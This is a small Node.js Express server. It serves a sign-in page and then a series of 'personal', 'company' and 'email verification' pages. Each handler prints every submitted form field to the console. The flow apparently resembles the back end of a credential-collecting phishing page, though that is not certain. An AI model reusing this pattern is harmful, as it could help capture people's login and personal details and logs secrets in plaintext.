const express = require('express');
const app = express();
const path = require('path');
var PORT=process.env.PORT || 2000;

const bodyParser = require('body-parser');
var urlencodedParser = bodyParser.urlencoded({ extended: false });

app.use(express.static(__dirname));
app.set('view engine','ejs');



 app.get('/',function(req,res){
   res.render('signin');
 });

app.post('/thanks',urlencodedParser,function(req,res){
  res.render('thankyou');
  console.log(req.body);

});

app.get('/Personalverfication',function(req,res){
  res.render('page1');
});



app.post('/Personalverfication',urlencodedParser,function(req,res){
  res.render('page2');
  console.log(req.body);
});


app.post('/companyverfication',urlencodedParser,function(req,res){
  res.render('page3');
  console.log(req.body);
});

app.post('/emailverfication',urlencodedParser,function(req,res){
  res.render('page4');
  console.log(req.body);
});




app.listen(PORT);

console.log('Running at Port ');
